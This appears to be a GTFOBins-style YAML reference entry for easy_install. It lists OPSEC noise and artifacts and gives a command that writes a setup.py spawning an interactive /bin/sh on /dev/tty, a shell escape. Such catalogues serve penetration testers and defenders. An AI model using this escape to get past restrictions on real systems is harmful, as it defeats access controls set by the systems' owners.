---
name: easy_install
capabilities:
- exec
required_permissions:
  level: user
  notes: Inherits behavior from python.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  notes: Chains to python; OPSEC follows that binary's profile.
persistence_potential: false
examples:
- id: inherit
  description: Inherits attack surface from `python` — see that entry.
  capabilities:
  - exec
  command: |-
    echo '...' >setup.py
    easy_install .
  notes: |-
    This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).

    Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:

    ```
    echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
    ```
references:
- https://gtfobins.github.io/gtfobins/easy_install/
tags:
- inherit
- python
---
